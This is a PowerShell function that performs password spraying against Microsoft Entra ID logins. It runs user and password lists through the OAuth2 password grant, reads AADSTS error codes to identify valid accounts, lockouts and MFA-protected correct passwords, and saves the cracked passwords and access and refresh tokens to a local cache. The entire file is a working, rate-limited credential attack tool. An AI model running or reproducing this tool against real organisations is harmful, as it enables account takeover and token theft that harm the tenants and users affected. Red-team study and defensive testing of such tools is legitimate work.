function Invoke-Spray {
    param(
        [string]$user,  # Path to the file containing users
        [string]$pass,  # Path to the file containing passwords
        [int]$threshold,  # The threshold for max attempts per minute
        [string]$url = 'https://login.microsoftonline.com',  # Default URL
        [string]$output,  # Output file to save results
        [string]$tokenFile = 'tokenCache.json'  # File to save access token
    )

    $domainCacheFile = "domainCache.json"
    $domainCache = @{}

    # Load the cached domains if the file exists
    if (Test-Path $domainCacheFile) {
        $domainCache = (Get-Content $domainCacheFile | ConvertFrom-Json)
    }

    # Initialize token cache at the beginning
    $folderPath = ".\jsonModules"
    if (-not (Test-Path -Path $folderPath)) {
        New-Item -ItemType Directory -Path $folderPath | Out-Null
    }
    $fullTokenPath = Join-Path -Path $folderPath -ChildPath $tokenFile
    $existingTokens = @{}

    if (Test-Path $fullTokenPath) {
        try {
            Write-Host "[*] Loading existing tokens from $fullTokenPath"
            $fileContent = Get-Content -Path $fullTokenPath -ErrorAction Stop | Out-String
        } catch {
            Write-Warning "Failed to load existing tokens."
        }
    } else {
        Write-Host "[*] Token file does not exist. Creating.."
    }

    $datetime = Get-Date -UFormat "%m/%d/%Y %R %Z"
    $sprayResult = @()

    # Load users and passwords
    $usernames = @(Get-Content $user)
    $passwords = @(Get-Content $pass)
    $total = $usernames.count * $passwords.count
    $exptime = $total / $threshold

    Write-Host -ForegroundColor "yellow" "[*] The url to attack is" $url
    Write-Host -ForegroundColor "red" "[*] " $usernames.count "user(s) detected"
    Write-Host -ForegroundColor "red" "[*] " $passwords.count "password(s) detected"
    Write-Host -ForegroundColor "cyan" "[*] Operating at" $threshold "spraying attempts per minute. $total combinations found. Expected time to complete is $exptime minutes."
    if ($output -ne "") {
        Write-Host -ForegroundColor "yellow" "[*] Results will be saved to $output"
    }
    Write-Host -ForegroundColor "red" "[*] Starting Spray..."

    $errorResonseValues = @{
        "AADSTS50126" = @("    The password for <username> appears to be incorrect.", "Failure")
        "AADSTS50053" = @("    WARNING! <username> appears to be locked, skipping further attempts", "Account Locked")
        "AADSTS90002" = @("    WARNING! <username> appears to be locked, skipping further attempts", "Account Locked")
        "AADSTS50034" = @("    The user <username> cannot be found, tenant appears correct. Removing from the validated list..", "User Does Not Exist")
        "AADSTS50059" = @("    Supplied tenant for <username> not found, removing from the validated list..", "Tenant Does Not Exist")
        "AADSTS50076" = @("[*] Password for <username> is correct but user has MFA enabled (DUO or MS)", "Correct Password MFA Blocked")
        "AADSTS90014" = @("    Issue with request")
    }

    $regex = 'AADSTS\d{5}'
    $ErrorActionPreference = 'silentlycontinue'

    # Track the tokens we successfully get
    $allTokens = @{}

    for ($counter = 0; $counter -lt $usernames.length; $counter++) {
        $un = $usernames[$counter]
        $userFound = $true  # Assume user is valid initially
        foreach ($passes in $passwords) {
            $body = @{
                'client_id' = '5aa316d3-d05a-485f-a849-e05182f87d1d';
                'grant_type' = 'password';
                username = $un;
                password = $passes;
                scope = 'openid'
            }
            $headers = @{ Accept = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded' }
            $response = Invoke-WebRequest -Uri "$url/organizations/oauth2/v2.0/token" -Method Post -Body $body -Headers $headers -ErrorVariable errorResponse

            # Convert error to string
            $errorResponseString = $errorResponse | Out-String

            # Successful login attempt
            if ($response.StatusCode -eq 200) {
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $un : $passes"
                $sprayResult += "$datetime, Success, $un, $passes"

                # Extract and store the access and refresh tokens
                $tokens = $response.Content | ConvertFrom-Json
                $accessToken = $tokens.access_token
                $refreshToken = $tokens.refresh_token
                $idToken = $tokens.id_token

                # Store tokens for this user
                $allTokens[$un] = @{
                    'password' = $passes.ToString()
                    'id_token' = $idToken
                    'access_token' = $accessToken
                    'refresh_token' = $refreshToken
                }

                # Merge and save tokens back to the file
                foreach ($key in $allTokens.Keys) {
                    $existingTokens[$key] = $allTokens[$key]
                }

                try {
                    $existingTokens | ConvertTo-Json -Depth 10 | Out-File -FilePath $fullTokenPath -Encoding utf8
                    Write-Host -ForegroundColor "Green" "[*] Tokens saved successfully to $fullTokenPath."
                } catch {
                    Write-Error "Failed to save tokens. Error: $_"
                }

                $response = ""
                Start-Sleep (60 / $threshold)
                break
            } else {
                # Handle unsuccessful attempts
                if ($errorResponseString -match 'AADSTS\d{5}') {
                    $errorCode = $matches[0]
                    if ($errorResonseValues.ContainsKey($errorCode)) {
                        # Get error message and replace <username> with the actual username
                        $values = $errorResonseValues[$errorCode]
                        $message = $values[0] -replace '<username>', $un
                        Write-Host "$message"

                        # Special case for locked accounts, incorrect tenants, or user not found
                        if ($errorCode -eq "AADSTS50059" -or $errorCode -eq "AADSTS50034") {
                            # Remove the user from the validated list
                            $userFound = $false
                            break
                        } elseif ($errorCode -eq "AADSTS50053") {
                            Write-Host -ForegroundColor "Yellow" "$message"
                            Start-Sleep (60 / $threshold)
                            break
                        } else {
                            $sprayResult += "$datetime, $($values[1]), $un, $passes"
                            Start-Sleep (60 / $threshold)
                        }
                    } else {
                        Write-Host "Unhandled error code: $errorCode"
                        Start-Sleep (60 / $threshold)
                    }
                }
            }
        }
        # Remove user from list if not found
        if (-not $userFound) {
            $usernames = $usernames | Where-Object { $_ -ne $un }
        }
    }

    # Write the output to a CSV file:
    if ($output) {
        $sprayResult | Out-File -Encoding ascii $output
    }

    # Save the updated validated users back to the file
    $usernames | Out-File -Encoding ascii $user
}
